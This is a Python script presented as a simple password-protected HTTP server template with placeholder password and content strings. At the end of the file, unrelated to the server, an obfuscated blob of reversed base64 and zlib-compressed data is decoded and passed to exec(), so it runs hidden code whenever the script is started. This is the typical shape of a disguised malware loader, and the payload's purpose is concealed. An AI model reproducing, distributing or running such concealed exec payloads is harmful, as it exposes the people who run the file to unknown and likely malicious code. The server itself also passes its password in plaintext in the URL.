import urllib
from http.server import SimpleHTTPRequestHandler, HTTPServer
class MyRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path); query_params = urllib.parse.parse_qs(parsed_path.query)
        correct_password = "YOURPASSWORDISHERE"
        if not correct_password: self.send_response(500); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(b"<html><body><h1>Server Error</h1><p>Please check if you input your password correctly.</p></body></html>"); return
        if 'password' not in query_params: self.send_response(403); self.send_header("Content-type", "text/html"); self.end_headers(); self.wfile.write(b"<html><body><h1>Access Denied!</h1><p>Password parameter missing. Please provide the correct password or try this way: http://127.0.0.1:8000/?password=Actual-Password</p></body></html>"); return

        password = query_params['password'][0]
        if password == correct_password:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"""
                             
                             
                             
                             
                             
                             YOUR CODE IS HERE!!!
                             
                             
                             
                             
                             """)
            return
        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"""<html><body><h1>Access Denied!</h1><p>Incorrect password. Try again.</p></body></html>""")
            return             
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==gsXkvd/sv///j8Vibw/mwB93qxSsK19xSU5nr4wkZUcTDZXD4CGyBoCz0JO0f9qQDEBJkqA7POQw3/513BxscTyuFOomsc4cxUCQOX+qyWRslGkgoSrA5guHf6KvPAdXNQh0ac2vVcTtEZ8eSUKypxK1JdAN2yBbvKeev7lzLhsQ/K6vaSFrVNLv6KBhQSRul4XklNJsg1l6/JIEcSq6sgh6xJ3bt734RbgiHQ+wZvl1SQPFR7rhPws7A91aUC8SbVbUMUNSKeid0RHXWzM7Okp9HqqcpsGsxyYBZQLDhknrYYMuKN21khuyWl2pG8VgMeqxKlb4iAIRdKRIuo+dZakiLIfrQZrrMCIVLt7h2qHLomRz8ibIFJUgfF+pywPEqZSR+bA5FhB+B3Vd4gqhAnxZ0vViKTHDJLqyt9B6GxsC8sDftm5wu+7rHyupc3vthmdzOAhj+Qcmc5k+AtlP48WHyF2N3VbOWWAa5ncIBgTzgtp83/svc6fDnOqpsEI9ZSUgZ93firfdh2dS1Za3ky2SfzD2rZdh8aiTUSFGeQQKWiUlSUIcri09GvdYzHMRlo5OUzL2ECpMuaPCP2L4u8rwXCkVN35KJBnRot52/ANiaVI23DW3gpxlmrifODdJXVCifvIs9d2OIX3FycExwePSvZk3oRkzRygKfnh69DQmYIo33Yi8zypgclWZ8Sqb/fUwuFisBY7qgGPoF1GPkQf2a39uamTSs2+URUHzY5ZfcfQdZKy02mAFkdAYUXOAvf/SLzZG9l0eLEpWGG2/Iw/azWyDfDw/t9M4St+KrQBgFXCYWG/iVJP3OK3M6XuDEioJRWWzCpsK//sLgL7OpHpCWHScM8AByMIov5qs/FSZBWzHHxPNsbOl4wiFQQLpYn2IMVQB58WzYJrZZ8Mf49N5ktNVxZ8n98h5sUi9lq4S3rIAyBKTTJiZhLOc9eyWU9m+jHHd6e/Rg7w8JkEAVEzp7gd09WUThFhpclADc2vuL5InmhFqPfsiKbsEPLIrGHm5rkaU2eu8rJ6ZP6q1yNhShZ5DUFf9RVGqPzLwWEkHY2+F0bp/JGYlpfV7vyhV2NqIHp9XKBl1kj7WNxG4mG2rRip4C9h3UZwNSG6huhYj9+IR1ND6qXeJdzKUtmLjDHNegB+cu3eRuRYVpHIJJJBtyf6dJDxO/rVYh2yRiu2nc7bTLWroDotkoKNNpdtH9IR0PN9kq4KUFvvaUhdibs18aauHn9ZgU+EHza8pLdFSEB5sGa8f0EEFZY4kCB2aoiDotGVzZS+k552HyCeE/UVU1egdTkGZ1lFK3y41t1GTpzhVIB0u/Q4460hyPLTfi1dkel7zyk4IEW+1Krx8HVl4UEuWYFxRJMBOSoCN+NClHdOjKQQrLT6SZqRgz/Gklm7OdKiVT1OJlCg2WRV/PQvWq/moI5fXQ9V+bgFrvSqU5IfSNXiLUpzYp0VGnSs18YTbG2WOM5W/c3CK3T9sl7mBMx7ykH5Eu5DiGcTHqgCObxJSevEfaSk+tpwqUMKpFJKpC+YcRpo50yJ1cvZhnySPdA4TYufI1uiflbjRSSHI/d3F3YJ9NIbnZbjYGWSHLnrQJ+UEdPYTQ7jgfNWo1vpQ82FgjDNSXHbsBVBTuLCSUccnux0+HXnSUeIC4BYjgTBkocLcjpLFScD6qRida7fP49oqsBfeGk+hE1M/2HLUA5au9o04nVZReZ13hSymZOyeHSR00zkTHJAWCSlcHxLv/yIhAeVJJgK/0BxLMinx+02DXV+NNdip5D2MSo4kSBySBUgSxZ2DWz/G2su04q3x0XfrtQ70w20YxYtcxE3LUuiX3zpmMMAt1YTslaZ66SirEpzn0FRZb1LI6H6sSbidDnslcz/3Uk5qcDRAzouKziimmzQxNdLPWXRLXcTs6Zsha2MDvEqpVWI3wB1bHrMIz0pj8NeVZqDVHzrKs13dscCRK17eyb/68hYNK9xomhQhLex/VWXMqQbOOEpm8hA1L9rEKyzyvDqXPVsIRAI+f7g97kTL6kN/AcJia8OMpUkzm9/zISQeOFUZUOx1FHyWlVJDNrS1aJn8I87K3ChLkBaEyJ8dK6IxMPtwCb/s7GUAof+aPj8VzJFRPptlymAyZWcCRaC5dL8l4+Vfald+8nJrkt5q3zqiU+eliovqDtYmqZJpVMF5wUFin/xYXXHO+ZdSVSkfLuqXHaYDt5xhdD3tmvNj0uClApFanosT3HYqGrWR/Pz/IJAiWt/ccjir2dipXmy4LT4a6YnISQENpkYV6DBVqXzSZbHW2UbnExQiK+qgkEmBDS0717AgV0jVZjJ8/x0srPHJ4gv/kqrwOdI2Vr5kxgNhL2FbplV/LpkH/9ztnyCLMB5hHTJBuukwvVlRALIZK+v8rb52KdvSbW9Yzz15VvxahAk5/LWSkMgn+HTEWg2mAgrcsKXDiH2ddYTAuKi7LY+MPSrJBPt35AHt/WjBqcTmn76G+Tc/LBLFHNxV8U9f89cwtOwCoK543fBSs9ZnjtQ/o/9M+9sbLLbEpNJfv8mh8szNVSeIGjnePjUsot4wfcRwZxgPTT9U4t9HFgK9TzXm9ZjMnwBXNyed+bzywXjtsqrTxuQZLsph7xxbAM1UmVd1Fxt4+qmIhDuHFrPQDlJVs5r6/QFI9b9Ghs87AA0bmQsO0pM6ast7wNMduxyGHr7dtrv8nDWEh0XBLfI1rKlgHEHjMN12PZ43vyOzsnXKCSVHF++Xg5OX6F4/ybUen9Z/pxVS33YPlTNbW3TGiQaSUwRtNsH7HmBB2PBzopGoSksvP9mlbrpChhi6SuVT9HXmcyJdMtHRrS9fNd54bPeZQAyEkBChKZNLDAixNHNze3pZ/e+RjEkiOF+IL4G7+lk2bSTywK3VUDINEBeKwaXmKsBBs7QL9176+qckMy6039gOg60FqF7Aphffsm8PSOam4mhDV5YCJ/ExHqNPaDodMewBlGMsWxzbW2gYdVmkJ+YlLrNkn6C84tWNL9MzhzkhQPZ6bneoBz8eNmXPsGyjQknGcblGv1meZJyL4pNHtsmhWH2BoDbujz8FM5LIo+iFN3NlshdXn/AAcSm/hD03sbvxyoQNw6pfvxIKGvrlp6zNpUwW8tjh6Yd2Q0NPDekyg/flFQ1NqThBHuAaBUMLLXBh3t1pXM/kBQ2+TywrR988J80TeI/tRD1rLbZMNFwKNXDe+MX+M4NSjdfMKC9UidQT+xvtoiXpcYDqYuw/siyoVuhKVcQ0uXd9I6rBqj5Bjet11C0NjoXExSGqvb6XzJz8uzYggUl6iU2m8atnQf1SBvUBhRD1berKe1QrQbHMES6tADqGRWU4xKAPaANZ/7PLE83LJUGn+TyPhG4YBRSFS9vVhg0e9gyb5kUWAQ7O0c3ToUx1RWy59+IuILMBaCcMZ9WmzsVV7TWR/zZMVNwbf2LYhgbLnnlhL9tHHb/gDK6eEaQFrQTPNVyTRngdVen1oR8d622aHZaw2wyxyfdYCQFlE7lseg5NGt9to15RvYhF+qOlCEUj5eCwrAnvQqGtFCylGf4+NYlgyMZ0eWOG79Zv0NOkWW883PgOJm159R2Wmb/XVtOCoHJZdNgiUC1P1KrY88gbEya4P4uGHvRir7V8MnvpiSycjqEdP79JtNSUoOVtjhNu8079H5+J/28CqMJibWPTuOjMvPZvjHQ2VsBIpwFRKgjGIpPo3pbqEG/t7XIw+dCjrX5+j1yCQDuuxtc09VCv8Z2r4VO57OYM1LPofWWv2jbVE9kSzAitpuSJ6vCZliqRk/SbFIq1PPfvsmn1cQzKjjXSXZH7+gD3Sb/k9Ut2oZC0casPFfp6XA99uO5hCpeP0bulOxaU6XIhMtcyUVa8kNx7ZMzRdA/Nrk6ISW8iHLwh9G4OZg0EhjQuEjxvfst5x0yjdNtRlx3QYhS05SYhUKSDDaXldqolR4eiphYDKKbZNbmON2mM2odNzjWvl1gGPCgm07S8a6tjCGJt/+SkcYBKDi4nLkfFQBGl1Lep8IEwF8x9VSaTQ0t/VXGXp3jXeuS7RFVXPKEsv6o8Ud6G/fUIqAN361HpMJc43AXkL9qbCcdLwPXm0Efs/aM570/HwG8z+YOQqa2bm94QmP7x/BZBOsu0dZ1jDvcgahG3ammnXbE9lYBfpPsdMCByUzMaFUw/CgiIT6KXjsRvH0362CVELXdYwLw8FUAjUg/CxGrD1mXkn/3/DxE4RXZWH93DjOJJB8iniLK61m49rU0tRt2nSD3k/2iHn2gQsAsRk8OKHMeBPkFyxOP9OPi+V/sCVkQNbisryRaIxZIONFIWV8u0HVwNz3XsIzZaQi5MG3zl0bslZAdSM+eEoOGM170JX9g3AWt4cdc0R5R7ZACWC87SDVPutzEMoJM2Qh1OzC62xqN68Rea3tDn9vsQi0H6Z/Rgek+2LqBNocV1+t+IuzSm1HBtAXtZADqMKczWhbc1DjmM/3vWSqNrF+1s0BRegK60+wZeEna/EDkcsqZTEUIsdwAdL+90Ovk8b5TS15jLlgrl1G2XZvPBADTxpF2/kKTkpZsA34J2X4ClbDxTNDyiDaHRgdvz1P4WHFlYXDeyig3rBiRvmiXoOctJoow/gt9fjxZ+liPN7yOzvynVRatXTplrZ6v+ys7t7RkvxzQ/Kk1/LoXQQFReQjd2oUzE8vOXnRIA1UUmyv6Y3xcyj+vpxza3hdubiDVjlpak63WeK8sM5Lx601LiBf9KGIW3/TPTNVtF/NBNXF+PxXCwiuoajWf26DwmzCjd4g84bK4ltlJvmNypTcYJ/KE6TNcVCS/wFnQ2zjQU/sHJfNKpfFFexlax/hdeB81zvv5XsESCGIu8MII0Ypj51WfnzpnAkqBz5lEVdINcksLIGcoWejbrukIubF7HBzG57IQG+JlEIxRNn6jBt5NcilsAJsQNQX8jgQjQSlcI30J8TVOw6nsrYXoZs2dHqICvERk1AEvne/d4iQBZuwapEoEK0cTL0efnK/QuZ2Q/DHJG6lciCIQWthLZ/exZzvpgJk/oS8c43o5BeIPP7mg0WNzRIGzKuYYFm+EQeaM+gt2AxRPe3WHlGstwRVa9+g4zINJlAXM7l/gzbrv66SsVfERAWPUHX7QcRcSeG9QdggajxE/h8aHG+KhoJsvgZ1cYd17J/qJu9ps4FJq6Pul+NP+0+M093rPAYCLmzBKd2qM/ybBn1ygs/bPh34IPEWHvq/CTTT1DAWT9tdoWPem79zIVheQ/GUWd8NI9aPGQAaWTihYY9zSgOmQWpF2zhiKY9poZs8zXu3WKDdZbopNzV+IeoH+DisbRy026Rf87qZ+Vcg03A9NYbIp7oDGiGj86iF3aL0QKBzecJAK21/5i7PQj9W1yLFQxnbW2Kkco8wk0rlPpqMvts5zmZD0DEAAEkA5djf6+9++/X2/8+9//zz+XmPQle6RkmnAce/0v+MxEzmZlJietIeiZRmX5EPSiUxyW0VVwJe'))